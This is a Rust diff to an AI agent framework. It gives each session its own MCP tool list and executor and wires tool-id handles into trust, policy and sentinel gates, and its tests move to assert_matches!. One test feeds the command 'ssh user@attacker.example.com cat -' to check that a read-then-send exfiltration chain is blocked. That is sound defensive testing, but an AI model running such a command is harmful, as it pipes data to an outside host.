@@ -310,8 +310,10 @@ pub(crate) async fn build_shared_core(
 /// - **Optional runtime providers** (`summary_provider`, `judge_provider`,
 ///   `quarantine_provider`) — contain HTTP client pools (`AnyProvider`) with runtime state;
 ///   excluded from `session_config` because they are not purely config-derived.
-/// - **MCP objects** (`mcp_tools`, `mcp_registry`, `mcp_manager`, `mcp_shared_tools`,
-///   `mcp_config`) — runtime + config mixture; passed together to `with_mcp()`.
+/// - **MCP objects** (`mcp_tools`, `mcp_registry`, `mcp_manager`, `mcp_media`,
+///   `mcp_config`) — runtime + config mixture; passed together to `with_mcp()`. Each session
+///   builds its own `McpToolList` and `McpToolExecutor` from them, so no tool-list write
+///   crosses sessions.
 /// - **ACP-specific** (`acp_*`) — transport-level config; not agent-level.
 /// - **Scheduler runtime** (`scheduler_*`) — runtime broadcast senders; not config-derived.
 #[cfg(feature = "acp")]
@@ -478,7 +480,9 @@ pub(crate) struct SharedAgentDeps {
     mcp_tools: Vec<zeph_mcp::McpTool>,
     mcp_registry: Option<zeph_mcp::McpToolRegistry>,
     mcp_manager: std::sync::Arc<zeph_mcp::McpManager>,
-    mcp_shared_tools: std::sync::Arc<RwLock<Vec<zeph_mcp::McpTool>>>,
+    /// MCP image passthrough settings (sanitizer and per-result cap) applied to every session's
+    /// `McpToolExecutor`; `None` when `--no-mcp-media` is set.
+    mcp_media: Option<(std::sync::Arc<zeph_sanitizer::MediaSanitizer>, usize)>,
     mcp_config: zeph_core::config::McpConfig,
 
     // Optional runtime providers (contain HTTP client pools; excluded from session_config)
@@ -887,20 +891,15 @@ async fn build_acp_deps(
     } else {
         mcp_manager.connect_all().await
     };
-    let mcp_shared_tools = std::sync::Arc::new(RwLock::new(mcp_tools.clone()));
-    let mut mcp_executor =
-        zeph_mcp::McpToolExecutor::new(mcp_manager.clone(), mcp_shared_tools.clone());
-    if config.cli.no_mcp_media {
+    let mcp_media = if config.cli.no_mcp_media {
         tracing::info!("--no-mcp-media: MCP image passthrough disabled for this session");
+        None
     } else {
-        mcp_executor = mcp_executor.with_media(
+        Some((
             std::sync::Arc::new(zeph_sanitizer::MediaSanitizer::new(&config.mcp.media)),
             config.mcp.media.max_images_per_result,
-        );
-    }
-    if let Some(ref logger) = acp_audit_logger {
-        mcp_executor = mcp_executor.with_audit(std::sync::Arc::clone(logger));
-    }
+        ))
+    };
     let diagnostics_executor = crate::agent_setup::build_diagnostics_executor(config);
     let clock: std::sync::Arc<dyn zeph_common::ClockSource> =
         std::sync::Arc::new(zeph_common::SystemClock);
@@ -930,9 +929,8 @@ async fn build_acp_deps(
         crate::agent_setup::with_search_executor(base_executor, web_search_executor);
     let index_provider = crate::bootstrap::resolve_index_embed_provider(config, provider.clone());
     let inner_executor: std::sync::Arc<dyn zeph_tools::ErasedToolExecutor> = {
-        let base: std::sync::Arc<dyn zeph_tools::ErasedToolExecutor> = std::sync::Arc::new(
-            zeph_tools::CompositeExecutor::new(base_executor, mcp_executor),
-        );
+        let base: std::sync::Arc<dyn zeph_tools::ErasedToolExecutor> =
+            std::sync::Arc::new(base_executor);
         if let Some(search_executor) = crate::agent_setup::build_search_code_executor(
             config,
             app.qdrant_ops().cloned(),
@@ -1244,7 +1242,7 @@ async fn build_acp_deps(
         mcp_tools,
         mcp_registry,
         mcp_manager,
-        mcp_shared_tools,
+        mcp_media,
         mcp_config: config.mcp.clone(),
         summary_provider,
         judge_provider: app.build_judge_provider(),
@@ -1511,7 +1509,6 @@ where
     mcp_tools: Vec<zeph_mcp::McpTool>,
     mcp_registry: Option<zeph_mcp::McpToolRegistry>,
     mcp_manager: std::sync::Arc<zeph_mcp::McpManager>,
-    mcp_shared_tools: std::sync::Arc<RwLock<Vec<zeph_mcp::McpTool>>>,
     mcp_config: zeph_core::config::McpConfig,
     focus_config: zeph_core::config::FocusConfig,
     sidequest_config: zeph_core::config::SidequestConfig,
@@ -1599,7 +1596,6 @@ where
         Some(deps.mcp_manager),
         &deps.mcp_config,
     )
-    .with_mcp_shared_tools(deps.mcp_shared_tools)
     .with_focus_and_sidequest_config(deps.focus_config, deps.sidequest_config)
     .with_trajectory_and_category_config(deps.trajectory_config, deps.category_config)
     .with_provider_pool(deps.provider_pool, deps.provider_config_snapshot)
@@ -1639,7 +1635,7 @@ where
 async fn spawn_acp_agent(
     d: std::sync::Arc<SharedAgentDeps>,
     mut channel: zeph_core::channel::LoopbackChannel,
-    acp_ctx: Option<zeph_acp::AcpContext>,
+    mut acp_ctx: Option<zeph_acp::AcpContext>,
     session_ctx: zeph_acp::SessionContext,
 ) {
     use std::sync::Arc;
@@ -1680,10 +1676,14 @@ async fn spawn_acp_agent(
     let code_qdrant_ops = d.code_qdrant_ops.clone();
     let shutdown_rx = d.shutdown_rx.clone();
     let config_path = d.config_path.clone();
-    let mcp_tools = d.mcp_tools.clone();
+    // The IDE's own MCP servers for this session join the shared tools, so the session's tool
+    // list (and its id registry) covers them from the first turn.
+    let mut mcp_tools = d.mcp_tools.clone();
+    if let Some(ctx) = acp_ctx.as_mut() {
+        mcp_tools.append(&mut ctx.ide_mcp_tools);
+    }
     let mcp_registry = d.mcp_registry.clone();
     let mcp_manager = Arc::clone(&d.mcp_manager);
-    let mcp_shared_tools = Arc::clone(&d.mcp_shared_tools);
     let mcp_config = d.mcp_config.clone();
     let summary_provider = d.summary_provider.clone();
     let judge_provider = d.judge_provider.clone();
@@ -1832,9 +1832,25 @@ async fn spawn_acp_agent(
         Arc::clone(&trajectory_signal_queue),
         &d.shell_config,
     );
+    // Per-session MCP tool list and executor: this session's agent is the only writer of its
+    // list, so a `/mcp` change or pruning in one session cannot rewrite another session's
+    // executor view or provenance registry (#7075). Built-ins stay ahead of MCP tools.
+    let (mcp_tool_list, mcp_tool_reader) = zeph_mcp::McpToolList::new(mcp_tools.clone());
+    let mcp_ids_handle = mcp_tool_list.ids_handle();
+    let mut session_mcp_executor =
+        zeph_mcp::McpToolExecutor::new(Arc::clone(&mcp_manager), mcp_tool_reader);
+    if let Some((sanitizer, max_images)) = d.mcp_media.clone() {
+        session_mcp_executor = session_mcp_executor.with_media(sanitizer, max_images);
+    }
+    if let Some(ref logger) = d.audit_logger {
+        session_mcp_executor = session_mcp_executor.with_audit(Arc::clone(logger));
+    }
     let tool_executor: Arc<dyn ErasedToolExecutor> = Arc::new(zeph_tools::CompositeExecutor::new(
         session_shell_executor,
-        zeph_tools::DynExecutor(tool_executor),
+        zeph_tools::CompositeExecutor::new(
+            zeph_tools::DynExecutor(tool_executor),
+            session_mcp_executor,
+        ),
     ));
 
     let (base_composite, cancel_signal, provider_override, parent_tool_use_id): (
@@ -1914,12 +1930,12 @@ async fn spawn_acp_agent(
     // plus any ACP-provided fs/shell overrides) behind one outermost TrustGateExecutor,
     // matching runner.rs. Previously only the base chain carried a gate, so memory/MCP/
     // skill-loader tools composed outside it bypassed Quarantine/Blocked entirely.
-    let (trust_gated, mcp_ids_handle) = crate::agent_setup::apply_common_tool_gating(
+    let trust_gated = crate::agent_setup::apply_common_tool_gating(
         zeph_tools::DynExecutor(base_composite),
         &permission_policy,
         turn_trust_floor.clone(),
+        mcp_ids_handle.clone(),
     );
-    crate::agent_setup::register_mcp_tool_ids(&mcp_ids_handle, &mcp_tools);
 
     // #5958: shared trajectory risk slot/signal queue — written by begin_turn(), read by
     // PolicyGateExecutor; pending risk signal queue drained by begin_turn(). Created earlier
@@ -1937,6 +1953,7 @@ async fn spawn_acp_agent(
         &d.policy_gate_pieces,
         d.audit_logger.as_ref(),
         Some((&trajectory_risk_slot, &trajectory_signal_queue)),
+        &mcp_ids_handle,
     );
 
     // Spec 050 F2 (#5913): wrap with ScopedToolExecutor when capability_scopes are configured —
@@ -2016,12 +2033,15 @@ async fn spawn_acp_agent(
                 .unwrap_or(zeph_memory::ConversationId(0))
                 .0
                 .to_string();
-            let sentinel = Arc::new(zeph_core::agent::shadow_sentinel::ShadowSentinel::new(
-                store,
-                Box::new(llm_probe),
-                sentinel_cfg.clone(),
-                conversation_identity,
-            ));
+            let sentinel = Arc::new(
+                zeph_core::agent::shadow_sentinel::ShadowSentinel::new(
+                    store,
+                    Box::new(llm_probe),
+                    sentinel_cfg.clone(),
+                    conversation_identity,
+                )
+                .with_mcp_tool_ids(mcp_ids_handle.clone()),
+            );
             let turn_number = Arc::new(std::sync::atomic::AtomicU64::new(0));
             let risk_level = Arc::new(parking_lot::RwLock::new("calm".to_owned()));
             let probe_gate: Arc<dyn zeph_tools::ProbeGate> =
@@ -2043,13 +2063,6 @@ async fn spawn_acp_agent(
             (tool_executor, None)
         }
     };
-    // #5736: ShadowSentinel keeps its own MCP tool-id set (mirroring TrustGateExecutor's) so
-    // classify_tool can escalate MCP write/edit tools to ExfilCapable without a cross-crate
-    // ToolDef dependency at its call site, matching src/runner.rs.
-    if let Some(ref sentinel) = shadow_sentinel_arc {
-        crate::agent_setup::register_mcp_tool_ids(&sentinel.mcp_tool_ids_handle(), &mcp_tools);
-    }
-
     // Session persistence (spec-068, #5343): reuse the ACP session_id directly as the
     // zeph_common::SessionId — ACP already owns this session's identity/lifecycle, so no
     // separate minting/reuse logic is needed here (unlike the CLI/TUI path in runner.rs, which
@@ -2177,7 +2190,6 @@ async fn spawn_acp_agent(
         mcp_tools,
         mcp_registry,
         mcp_manager: Arc::clone(&mcp_manager),
-        mcp_shared_tools,
         mcp_config,
         focus_config: d.focus_config.clone(),
         sidequest_config: d.sidequest_config.clone(),
@@ -2235,7 +2247,7 @@ async fn spawn_acp_agent(
             shadow_sentinel: shadow_sentinel_arc,
             vigil_config,
             hooks_config: (!safe_mode).then_some(hooks_config),
-            mcp_tool_ids_handle: mcp_ids_handle,
+            mcp_tool_list,
             #[cfg(feature = "classifiers")]
             classifiers_config: classifiers_config.clone(),
             llm_classifier: feedback_classifier,
@@ -3068,6 +3080,7 @@ pub(crate) fn print_acp_manifest() {
 mod tests {
     use super::*;
     use serial_test::serial;
+    use std::assert_matches;
     use std::fs;
     use std::sync::Arc;
     use tempfile::TempDir;
@@ -3445,8 +3458,9 @@ mod tests {
             skill_name: None,
         };
         let result = base_executor.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::SandboxViolation { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::SandboxViolation { .. }),
             "expected SandboxViolation from DiagnosticsExecutor, got {result:?}"
         );
     }
@@ -3489,11 +3503,9 @@ mod tests {
             skill_name: None,
         };
         let result = base_executor.execute_tool_call(&call).await;
-        assert!(
-            matches!(
-                result,
-                Err(zeph_tools::ToolError::ConfirmationRequired { .. })
-            ),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::ConfirmationRequired { .. }),
             "expected ConfirmationRequired for diagnostics under Supervised autonomy, got {result:?}"
         );
     }
@@ -3564,7 +3576,7 @@ mod tests {
     #[tokio::test]
     async fn quarantine_blocks_memory_and_mcp_in_acp_composite_chain() {
         let mcp_tool = zeph_mcp::McpTool {
-            server_id: "mcp".to_owned(),
+            server_id: "mcp".into(),
             name: "write_file".to_owned(),
             description: String::new(),
             input_schema: serde_json::Value::Null,
@@ -3588,35 +3600,35 @@ mod tests {
                     zeph_tools::CompositeExecutor::new(AcpTaggedMock("overflow_flush"), base_tool),
                 ),
             )));
-        let (gated, mcp_ids_handle) = crate::agent_setup::apply_common_tool_gating(
+        let gated = crate::agent_setup::apply_common_tool_gating(
             inner_executor,
             &zeph_tools::PermissionPolicy::default(),
             zeph_common::TurnTrustFloor::default(),
+            crate::agent_setup::mcp_ids_handle_for(std::slice::from_ref(&mcp_tool)),
         );
-        crate::agent_setup::register_mcp_tool_ids(&mcp_ids_handle, std::slice::from_ref(&mcp_tool));
         zeph_tools::executor::ToolExecutor::set_effective_trust(
             &gated,
             zeph_common::SkillTrustLevel::Quarantined,
         );
 
         let memory_result = gated.execute_tool_call(&acp_test_call("memory_save")).await;
-        assert!(
-            matches!(memory_result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            memory_result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "memory_save must be denied under Quarantine, got {memory_result:?}"
         );
 
         let mcp_result = gated.execute_tool_call(&acp_test_call(&mcp_tool_id)).await;
-        assert!(
-            matches!(mcp_result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            mcp_result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "MCP-sourced tool must be denied under Quarantine, got {mcp_result:?}"
         );
 
         let skill_load_result = gated.execute_tool_call(&acp_test_call("load_skill")).await;
-        assert!(
-            matches!(
-                skill_load_result,
-                Err(zeph_tools::ToolError::Blocked { .. })
-            ),
+        assert_matches!(
+            skill_load_result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "load_skill must be denied under Quarantine, got {skill_load_result:?}"
         );
 
@@ -3688,8 +3700,9 @@ mod tests {
             skill_name: None,
         };
         let result = gated.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from PolicyGateExecutor deny rule, got {result:?}"
         );
     }
@@ -3751,8 +3764,9 @@ mod tests {
             skill_name: None,
         };
         let result = gated.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from AdversarialPolicyGateExecutor deny decision, got {result:?}"
         );
     }
@@ -3769,7 +3783,7 @@ mod tests {
         use zeph_tools::executor::ToolExecutor;
 
         let mcp_tool = zeph_mcp::McpTool {
-            server_id: "mcp".to_owned(),
+            server_id: "mcp".into(),
             name: "write_file".to_owned(),
             description: String::new(),
             input_schema: serde_json::Value::Null,
@@ -3791,12 +3805,12 @@ mod tests {
             )));
 
         // TrustGateExecutor (innermost gate), Quarantined trust.
-        let (trust_gated, mcp_ids_handle) = crate::agent_setup::apply_common_tool_gating(
+        let trust_gated = crate::agent_setup::apply_common_tool_gating(
             inner_executor,
             &zeph_tools::PermissionPolicy::default(),
             zeph_common::TurnTrustFloor::default(),
+            crate::agent_setup::mcp_ids_handle_for(std::slice::from_ref(&mcp_tool)),
         );
-        crate::agent_setup::register_mcp_tool_ids(&mcp_ids_handle, std::slice::from_ref(&mcp_tool));
         zeph_tools::ToolExecutor::set_effective_trust(
             &trust_gated,
             zeph_common::SkillTrustLevel::Quarantined,
@@ -3833,8 +3847,9 @@ mod tests {
         let policy_denied = gated
             .execute_tool_call(&acp_test_call("overflow_flush"))
             .await;
-        assert!(
-            matches!(policy_denied, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            policy_denied,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from PolicyGateExecutor's own deny rule, got {policy_denied:?}"
         );
 
@@ -3842,11 +3857,9 @@ mod tests {
         // TrustGateExecutor's Quarantine check — proves TrustGate isn't shadowed by the
         // outer PolicyGate.
         let quarantine_denied = gated.execute_tool_call(&acp_test_call("load_skill")).await;
-        assert!(
-            matches!(
-                quarantine_denied,
-                Err(zeph_tools::ToolError::Blocked { .. })
-            ),
+        assert_matches!(
+            quarantine_denied,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from TrustGateExecutor's Quarantine enforcement, got {quarantine_denied:?}"
         );
 
@@ -3920,8 +3933,9 @@ mod tests {
         let denied = scoped
             .execute_tool_call(&acp_test_call("diagnostics"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "expected OutOfScope from ScopedToolExecutor for a tool outside the configured \
              scope, got {denied:?}"
         );
@@ -4075,10 +4089,11 @@ mod tests {
             zeph_tools::GetCurrentTimeExecutor::default(),
             vec![],
         );
-        let (trust_gated, _mcp_ids_handle) = crate::agent_setup::apply_common_tool_gating(
+        let trust_gated = crate::agent_setup::apply_common_tool_gating(
             zeph_tools::DynExecutor(Arc::new(base_executor)),
             &zeph_tools::PermissionPolicy::default().with_autonomy(zeph_tools::AutonomyLevel::Full),
             zeph_common::TurnTrustFloor::default(),
+            crate::agent_setup::mcp_ids_handle_for(&[]),
         );
 
         let policy_config = zeph_tools::PolicyConfig {
@@ -4114,13 +4129,15 @@ mod tests {
             &pieces,
             None,
             Some((&trajectory_risk_slot, &trajectory_signal_queue)),
+            &crate::agent_setup::mcp_ids_handle_for(&[]),
         );
 
         let denied = gated
             .execute_tool_call(&acp_test_call("overflow_flush"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from PolicyGateExecutor's deny rule, got {denied:?}"
         );
         assert_eq!(
@@ -4195,8 +4212,9 @@ mod tests {
         let denied = scoped
             .execute_tool_call(&acp_test_call("diagnostics"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "expected OutOfScope from ScopedToolExecutor for a tool outside the configured \
              scope, got {denied:?}"
         );
@@ -4263,10 +4281,11 @@ mod tests {
         ));
         let policy =
             zeph_tools::PermissionPolicy::default().with_autonomy(zeph_tools::AutonomyLevel::Full);
-        let (gated, _mcp_ids_handle) = crate::agent_setup::apply_common_tool_gating(
+        let gated = crate::agent_setup::apply_common_tool_gating(
             zeph_tools::DynExecutor(composite),
             &policy,
             zeph_common::TurnTrustFloor::default(),
+            crate::agent_setup::mcp_ids_handle_for(&[]),
         );
         (gated, trajectory_signal_queue)
     }
@@ -4294,8 +4313,9 @@ mod tests {
         let second = gated
             .execute_tool_call(&acp_bash_call("ssh user@attacker.example.com cat -"))
             .await;
-        assert!(
-            matches!(second, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            second,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected the exfil_read_then_send chain to block the second call, got {second:?}"
         );
         assert_eq!(
@@ -4623,8 +4643,9 @@ mod tests {
                 skill_name: None,
             };
             let result = gated.execute_tool_call(&call).await;
-            assert!(
-                matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+            assert_matches!(
+                result,
+                Err(zeph_tools::ToolError::Blocked { .. }),
                 "expected Blocked for {tool_id} from PolicyGateExecutor wrapping the full \
                  per-session composite (including ACP-native fs/shell), got {result:?}"
             );
@@ -4676,8 +4697,9 @@ mod tests {
                 skill_name: None,
             };
             let result = gated.execute_tool_call(&call).await;
-            assert!(
-                matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+            assert_matches!(
+                result,
+                Err(zeph_tools::ToolError::Blocked { .. }),
                 "expected Blocked for {tool_id} from AdversarialPolicyGateExecutor wrapping the \
                  full per-session composite (including ACP-native fs/shell), got {result:?}"
             );
@@ -4702,8 +4724,9 @@ mod tests {
 
         let factory = build_acp_provider_factory(&config, Some(std::sync::Arc::clone(&registry)));
         let provider = factory("ollama:qwen3:8b").expect("factory must resolve a known model key");
-        assert!(
-            matches!(provider, zeph_llm::any::AnyProvider::Masked(_)),
+        assert_matches!(
+            provider,
+            zeph_llm::any::AnyProvider::Masked(_),
             "factory output must be wrapped when a secret registry is supplied"
         );
     }
@@ -5581,7 +5604,6 @@ mod tests {
             mcp_tools: Vec::new(),
             mcp_registry: None,
             mcp_manager,
-            mcp_shared_tools: Arc::new(RwLock::new(Vec::new())),
             mcp_config: zeph_core::config::McpConfig::default(),
             focus_config: zeph_core::config::FocusConfig::default(),
             sidequest_config: zeph_core::config::SidequestConfig::default(),
